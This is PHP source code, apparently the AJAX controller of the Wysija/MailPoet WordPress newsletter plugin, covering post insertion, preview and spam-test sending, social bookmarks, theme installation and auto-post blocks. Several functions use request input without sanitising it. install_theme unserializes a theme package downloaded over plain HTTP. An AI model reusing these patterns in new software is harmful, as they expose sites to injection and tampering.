		$params['is_search_query'] = true;

		$model_wp_posts = WYSIJA::get('wp_posts','model');
		$data = $model_wp_posts->get_posts($params);

		// extract data
		$posts = $data['rows'];
		// contains the total number of rows available
		$count = $data['count'];

		// return results
		$result = array(
			'result' => true,
			'append' => ($query_offset > 0)
		);

		if(empty($posts) === false) {
			foreach($posts as $key => $post) {
				// interpret shortcodes
				if($interpret_shortcode === true) {
					$posts[$key]['post_content'] = apply_filters('the_content', $posts[$key]['post_content']);
				}

				// get thumbnail
				$posts[$key]['post_image'] = $helper_articles->getImage($post);

				// set post status
				$post_status_label = '';
				if(isset($post_statuses[$posts[$key]['post_status']])) {
					$post_status_label = $post_statuses[$posts[$key]['post_status']];
				}
				$posts[$key]['post_status'] = $post_status_label;
			}
			$result['posts'] = $posts;
			$result['total'] = (int)$count['total'];
		}else {
			$result['msg'] = __('There are no posts corresponding to that search.', WYSIJA);
			$result['result'] = false;
		}

		return $result;
	}

	function insert_articles() {
		// get raw params
		$raw_params = $_REQUEST['data'];

		// format params
		$params = array();
		foreach($raw_params as $value) {
			$params[$value['name']] = $value['value'];
		}

		if($params['show_divider'] === 'yes') {
			// get divider
			$divider = $_REQUEST['divider'];
		} else {
			$divider = null;
		}
		$params['divider'] = $divider;

		// get post ids
		$post_ids = array();
		if(isset($_REQUEST['post_ids']) && strlen(trim($_REQUEST['post_ids'])) > 0) {
			$post_ids = explode(',', $_REQUEST['post_ids']);
		}

		if(empty($post_ids)) {
			// return error
			$res['msg'] = __('Please select an article.', WYSIJA);
			$res['result'] = false;
			return $res;
		}

		// specify custom fields to get from posts
		$post_params = array('include' => $post_ids);

		// include sort by parameter into post params
		$post_params['sort_by'] = $params['sort_by'];

		// get posts
		$model_wp_posts = WYSIJA::get('wp_posts', 'model');
		$posts = $model_wp_posts->get_posts($post_params);

		// check if we need to interpret shortcodes
		$model_config = WYSIJA::get('config', 'model');
		$interpret_shortcode = (bool)$model_config->getValue('interp_shortcode');

		// get some model and helpers
		$helper_articles = WYSIJA::get('articles', 'helper');
		$helper_wj_engine = WYSIJA::get('wj_engine', 'helper');

		$output = '';

		// save parameters for next time
		$model_config->save(array('insert_post_parameters' => $helper_wj_engine->encodeParameters($params)));

		foreach($posts as $key => $post) {
			if($interpret_shortcode === true) {
				// interpret shortcodes
				$posts[$key]['post_content'] = apply_filters('the_content', $post['post_content']);
			}
			// get thumbnail
			$posts[$key]['post_image'] = $helper_articles->getImage($post);
		}

		$output .= base64_encode($helper_wj_engine->renderPostsToBlocks($posts, $params));

		if(strlen($output) > 0) {
			$res['result'] = true;
			$res['posts'] = $output;
		}else {
			$res['msg'] = __('There are no posts corresponding to that search.',WYSIJA);
			$res['result'] = false;
		}

		return $res;
	}

	function send_preview($spamtest=false){
		$mailer=WYSIJA::get('mailer','helper');
		$email_id = $_REQUEST['id'];
		$resultarray=array();

		// update data in DB
		$model_email = WYSIJA::get('email', 'model');
		$model_email->getFormat=OBJECT;
		$email_object = $model_email->getOne(false,array('email_id' => $email_id));
		$mailer->testemail=true;


		if(isset($_REQUEST['data'])){
		   $dataTemp=$_REQUEST['data'];
			$_REQUEST['data']=array();
			foreach($dataTemp as $val) $_REQUEST['data'][$val['name']]=$val['value'];
			unset($dataTemp);
			foreach($_REQUEST['data'] as $k =>$v){
				$newkey=str_replace(array('wysija[email][',']'),'',$k);
				$configVal[$newkey]=$v;
			}
			if(isset($configVal['from_name'])){
				$params=array(
					'from_name'=>$configVal['from_name'],
					'from_email'=>$configVal['from_email'],
					'replyto_name'=>$configVal['replyto_name'],
					'replyto_email'=>$configVal['replyto_email']);
				if(isset($configVal['subject']))    $email_object->subject=$configVal['subject'];
			}

		}else{
			$params=array(
				'from_name'=>$email_object->from_name,
				'from_email'=>$email_object->from_email,
				'replyto_name'=>$email_object->replyto_name,
				'replyto_email'=>$email_object->replyto_email
			);
		}
		if(strpos($_REQUEST['receiver'], ',')) {
			$receivers = explode(',',$_REQUEST['receiver']);
		} else if(strpos($_REQUEST['receiver'], ';')) {
			$receivers = explode(';',$_REQUEST['receiver']);
		} else {
			$receivers = array($_REQUEST['receiver']);
		}

		$user_model = WYSIJA::get('user', 'model');
		foreach($receivers as $key => $receiver){
			$receiver = trim($receiver);
			$dummy_receiver = $user_model->get_object_by_email($receiver);
			if(empty($dummy_receiver)){
				$dummy_receiver = new stdClass();
				$dummy_receiver->user_id = 0;
				$dummy_receiver->email = $receiver;
				$dummy_receiver->status = 1;
				$dummy_receiver->lastname = $dummy_receiver->firstname = '';
			}

			if($spamtest){
				$langextra = '';
				$dummy_receiver->firstname ='Mail Tester';

				$wp_lang = get_locale();
				if(!empty($wp_lang)) $langextra ='&lang='.$wp_lang;
				$resultarray['urlredirect']='http://www.mail-tester.com/check.php?id='.urlencode($dummy_receiver->email).$langextra;
			}
			$receivers[$key] = $dummy_receiver;

		}

		$email_clone=array();
		foreach($email_object as $kk=>$vv)  $email_clone[$kk]=$vv;


		$wj_engine = WYSIJA::get('wj_engine', 'helper');
		// set data & styles
		if(isset($email_clone['wj_data'])) { $wj_engine->setData($email_clone['wj_data'], true); } else { $wj_engine->setData(); }
		if(isset($email_clone['wj_styles'])) { $wj_engine->setStyles($email_clone['wj_styles'], true); } else { $wj_engine->setStyles(); }

		// generate email html body
		$body = $wj_engine->renderEmail($email_clone);

		// get back email data as it will be updated during the rendering (articles ids + articles count)
		$email_child = $wj_engine->getEmailData();

		// [total] [number] and [post_title] are only valid for post notifications newsletter
		if((int)$email_child['type'] === 2 && isset($email_child['params']['autonl']['event']) &&
				$email_child['params']['autonl']['event'] === 'new-articles' && isset($email_child['params']['autonl']['articles'])){

			$item_count = 0;
			$total_count = 1;
			$first_subject = '';

			if(isset($email_child['params']['autonl']['articles']['count'])) $item_count = (int)$email_child['params']['autonl']['articles']['count'];
			if(isset($email_child['params']['autonl']['articles']['first_subject'])) $first_subject = $email_child['params']['autonl']['articles']['first_subject'];
			if(isset($email_child['params']['autonl']['total_child'])) $total_count = (int)$email_child['params']['autonl']['total_child'] + 1;

			$email_object->subject = str_replace(
				array('[total]','[number]','[post_title]'),
				array($item_count, $total_count, $first_subject),
				$email_child['subject']
			);
		}
		$successmsg = __('Your email preview has been sent to %1$s', WYSIJA);

		// correction added for post notifications with the tag [newsletter:post_title] failing to send
		if(isset($email_object->params['autonl']) && isset($email_child['params']['autonl'])){
			$email_object->params['autonl']=$email_child['params']['autonl'];
		}

		if(isset($email_object->params)) {
			$params['params']=$email_object->params;

			if(isset($configVal['params[googletrackingcode'])){
				$paramsemail=array();
				if(!is_array($email_object->params)) $paramsemail=unserialize(base64_decode($email_object->params));

				if(trim($configVal['params[googletrackingcode'])) {
					$paramsemail['googletrackingcode']=$configVal['params[googletrackingcode'];
				}
				else {
					unset($paramsemail['googletrackingcode']);
				}
				$params['params'] = base64_encode(serialize($paramsemail));
			}
		}

		$params['email_id'] = $email_object->email_id;
		$receiversList = array();
		$res = false;
		foreach($receivers as $receiver){
			if($mailer->sendSimple($receiver,  stripslashes($email_object->subject),$email_object->body,$params)) {
				$res = true;
				$receiversList[] = $receiver->email;
			}
			WYSIJA::log('preview_sent', $mailer, 'manual');
		}

		if($res === true) {
			$this->notice(sprintf($successmsg, implode(', ', $receiversList)));
		}

		$resultarray['result'] = $res;

		return $resultarray;
	}

	/**
	 * send spam test function step 2 of the newsletter edition process
	 */
	function send_spamtest(){
		return apply_filters('wysija_send_spam_test','',$this);
	}

	function set_divider()
	{
		$src = isset($_POST['wysijaData']['src']) ? $_POST['wysijaData']['src'] : NULL;
		$width = isset($_POST['wysijaData']['width']) ? (int)$_POST['wysijaData']['width'] : NULL;
		$height = isset($_POST['wysijaData']['height']) ? (int)$_POST['wysijaData']['height'] : NULL;

		if($src === NULL OR $width === NULL OR $height === NULL) {
			// there is a least one missing parameter, fallback to default divider
			$dividersHelper = WYSIJA::get('dividers', 'helper');
			$divider = $dividersHelper->getDefault();
		} else {
			// use provided params
			$divider = array(
				'src' => $src,
				'width' => $width,
				'height' => $height
			);
		}

		// update campaign parameters
		$email_id = (int)$_REQUEST['id'];
		$campaignsHelper = WYSIJA::get('campaigns', 'helper');
		$campaignsHelper->saveParameters($email_id, 'divider', $divider);

		// set params
		$block = array_merge(array('no-block' => true, 'type' => 'divider'), $divider);

		$helper_wj_engine=WYSIJA::get('wj_engine','helper');
		return base64_encode($helper_wj_engine->renderEditorBlock($block));
	}

	function get_social_bookmarks() {
		$size = isset($_POST['wysijaData']['size']) ? $_POST['wysijaData']['size'] : NULL;
		$theme = isset($_POST['wysijaData']['theme']) ? $_POST['wysijaData']['theme'] : NULL;

		$bookmarksHelper = WYSIJA::get('bookmarks', 'helper');
		$bookmarks = $bookmarksHelper->getAll($size, $theme);
		return json_encode(array('icons' => $bookmarks));
	}

	function generate_social_bookmarks() {

		$size = 'medium';
		$iconset = '01';

		if(isset($_POST['wysijaData']) && !empty($_POST['wysijaData'])) {
			$data = $_POST['wysijaData'];
			$items = array();

			foreach($data as $key => $values) {
				if($values['name'] === 'bookmarks-size') {
					// get size
					$size = $values['value'];
				} else if($values['name'] === 'bookmarks-theme') {
					// get theme name
					$theme = $values['value'];
				} else if($values['name'] === 'bookmarks-iconset') {
					// get iconset
					$iconset = $values['value'];
					if(strlen(trim($iconset)) === 0) {
						$this->error('No iconset specified', false);
						return false;
					}
				} else {
					$keys = explode('-', $values['name']);
					$network = $keys[1];
					$property = $keys[2];
					if(array_key_exists($network, $items)) {
						$items[$network][$property] = $values['value'];
					} else {
						$items[$network] = array($property => $values['value']);
					}
				}
			}
		}

		$urls = array();
		// check data and remove network with an empty url
		foreach($items as $network => $item) {
			if(strlen(trim($item['url'])) === 0) {
				// empty url
				unset($items[$network]);
			} else {
				// url specified
				$urls[$network] = $item['url'];
			}
		}

		// check if there's at least one url left
		if(empty($urls)) {
			$this->error('No url specified', false);
			return false;
		}

		// save url in config
		$config=WYSIJA::get('config','model');
		$config->save(array('social_bookmarks' => $urls));

		// get iconset icons
		$bookmarksHelper = WYSIJA::get('bookmarks', 'helper');

		// if the iconset is 00, then it's the theme's bookmarks
		if($iconset === '00') {
			$icons = $bookmarksHelper->getAllByTheme($theme);
		} else {
			// otherwise it's a basic iconset
			$icons = $bookmarksHelper->getAllByIconset($size, $iconset);
		}


		// format data
		$block = array(
			'position' => 1,
			'type' => 'gallery',
			'items' => array(),
			'alignment' => 'center'
		);

		$width = 0;
		foreach($items as $key => $item) {
			$block['items'][] = array_merge($item, $icons[$key], array('alt' => ucfirst($key)));
			$width += (int)$icons[$key]['width'];
		}
		// add margin between icons
		$width += (count($block['items']) - 1) * 10;
		// set optimal width
		$block['width'] = max(0, min($width, 564));

		$helper_wj_engine=WYSIJA::get('wj_engine','helper');
		return base64_encode($helper_wj_engine->renderEditorBlock($block));
	}

	function install_theme() {
		if( isset($_REQUEST['theme_id'])){
			global $wp_version;
			//check if theme is premium if you have the premium licence
			if(isset($_REQUEST['premium']) && $_REQUEST['premium']){
				$getpremiumtheme=apply_filters('wysija_install_theme_premium', false);

				if(!$getpremiumtheme){
					$helper_wj_engine = WYSIJA::get('wj_engine', 'helper');
					$themes = $helper_wj_engine->renderThemes();
					return array('result'=>false, 'themes' => $themes);
				}
			}

			$helperToolbox = WYSIJA::get('toolbox','helper');
			$domain_name = $helperToolbox->_make_domain_name(admin_url('admin.php'));

			$request = 'http://api.mailpoet.com/download/zip/'.$_REQUEST['theme_id'].'?domain='.$domain_name;

			$args = array(
					'timeout' =>  30,
					'body' => array(  ),
		 'user-agent' => 'WordPress/' . $wp_version . '; ' . get_bloginfo( 'url' )
			);
			$raw_response = wp_remote_post( $request, $args );

			if ( is_wp_error( $raw_response ) || 200 != wp_remote_retrieve_response_code( $raw_response ) ){
				if(method_exists($raw_response, 'get_error_messages')){
					$this->error($raw_response->get_error_messages());
				}
				$ZipfileResult = false;
			}else{
				$ZipfileResult = maybe_unserialize( wp_remote_retrieve_body( $raw_response ) );
			}

			if($ZipfileResult === false){
				$result = false;
				$this->error(__('We were unable to contact the API, the site may be down. Please try again later.',WYSIJA),true);
			}else{
				$themesHelp=WYSIJA::get('themes','helper');
				$result = $themesHelp->installTheme($ZipfileResult);

				// refresh themes list
				$helper_wj_engine = WYSIJA::get('wj_engine', 'helper');
				$themes = $helper_wj_engine->renderThemes();
			}
		}else{
			$result = false;
			$themes = '';
			$this->notice('missing info');
		}

		return array('result' => $result, 'themes' => $themes);
	}

	function refresh_themes() {
		// refresh themes list
		$helper_wj_engine = WYSIJA::get('wj_engine', 'helper');
		return array('result'=>true, 'themes' => $helper_wj_engine->renderThemes());
	}

	function generate_auto_post() {
		// get params and generate html
		$helper_wj_engine = WYSIJA::get('wj_engine', 'helper');
		$helper_articles = WYSIJA::get('articles', 'helper');

		// get parameters
		$block_params = array();
		if(isset($_POST['wysijaData'])) {
			// store category ids (TBR)
			$category_ids = array();

			foreach($_POST['wysijaData'] as $pairs) {
				// special cases
				switch($pairs['name']) {
					case 'author_label':
					case 'category_label':
					case 'readmore':
					case 'nopost_message':
						$block_params[] = array('key' => $pairs['name'], 'value' => base64_encode(stripslashes($pairs['value'])));
						break;
					case 'category_ids':
						$category_ids = array_filter( array_map( 'absint', explode( ',', $pairs['value'] ) ) );
					break;
					default:
						$block_params[] = array('key' => $pairs['name'], 'value' => $pairs['value']);
				}
			}

			// make sure we have only unique ids in categories
			$block_params[] = array('key' => 'category_ids', 'value' => join(',', array_unique($category_ids)));
		}

		if(empty($block_params)) {
			// an error occurred, do something!
			return false;
		} else {
			$data = array(
				'type' => 'auto-post',
				'params' => $block_params
			);
			return base64_encode($helper_wj_engine->renderEditorBlock($data));
		}
	}

	function load_auto_post() {
		$params = array();

		if(isset($_POST['wysijaData'])) {

			$pairs = explode('&', $_POST['wysijaData']);

			foreach($pairs as $pair) {
				list($key, $value) = explode('=', $pair);
				switch($key) {
					case 'autopost_count':
						$params[$key] = (int)$value;
						break;
					case 'readmore':
					case 'author_label':
					case 'category_label':
					case 'nopost_message':
						$params[$key] = base64_decode($value);
						break;
					case 'exclude':
						$params[$key] = explode(',', $value);
						break;
					default:
						$params[$key] = $value;
				}
			}
		}

		if(empty($params)) {
			// an error occurred, do something!
			return false;
		} else {

			// get email params
			$email_id = (int)$_REQUEST['id'];
			$model_email = WYSIJA::get('email', 'model');
			$email = $model_email->getOne(array('params','sent_at','campaign_id'), array('email_id' => $email_id));

			$helper_articles = WYSIJA::get('articles', 'helper');
			$helper_wj_engine = WYSIJA::get('wj_engine', 'helper');

			// see if posts have already been sent
			if(!empty($email['params']['autonl']['articles']['ids'])) {
				if(!isset($params['exclude'])) { $params['exclude'] = array(); }

				$params['exclude'] = array_unique(array_merge($email['params']['autonl']['articles']['ids'], $params['exclude']));
			}

			//we set the post_date to filter articles only older than that one
			if(isset($email['params']['autonl']['firstSend'])){
				$params['post_date'] = $email['params']['autonl']['firstSend'];
			}

			// if immediate let it know to the get post
			if(isset($email['params']['autonl']['articles']['immediatepostid'])){
				$params['include'] = $email['params']['autonl']['articles']['immediatepostid'];
				$params['post_limit'] = 1;
			}else{
				//we set the post_date to filter articles only older than the last time we sent articles
				if(isset($email['params']['autonl']['lastSend'])){
					$params['post_date'] = $email['params']['autonl']['lastSend'];
				}else{
					//get the latest child newsletter sent_at value
					$mEmail=WYSIJA::get('email','model');
					$mEmail->reset();
					$mEmail->orderBy('email_id','DESC');
					$lastEmailSent=$mEmail->getOne(false,array('campaign_id'=>$email['campaign_id'],'type'=>'1'));

					if(!empty($lastEmailSent)) $params['post_date'] = $lastEmailSent['sent_at'];
				}
			}

			// get posts
			$model_wp_posts = WYSIJA::get('wp_posts','model');
			$posts = $model_wp_posts->get_posts($params);

			if(empty($posts)) {
				// nothing to display
				$posts = array();
			} else {
				// used to keep track of post ids present in the auto post
				$post_ids = array();

				// cleanup post and get image
				foreach($posts as $key => $post) {
					if($params['image_alignment'] !== 'none') {
						// attempt to get post image
						$posts[$key]['post_image'] = $helper_articles->getImage($post);
					}

					// store article id
					$post_ids[] = $post['ID'];
				}
				// store article ids
				$params['post_ids'] = join(',', $post_ids);
			}

			// get divider if necessary (for immediate post notification, the "show_divider" parameter is not available)
			if(isset($params['show_divider']) && $params['show_divider'] === 'yes') {
				if(isset($email['params']['divider'])) {
					$params['divider'] = $email['params']['divider'];
				} else {
					$helper_dividers = WYSIJA::get('dividers', 'helper');
					$params['divider'] = $helper_dividers->getDefault();
				}
			}

			return base64_encode($helper_wj_engine->renderEditorAutoPost($posts, $params));
		}
	}
}
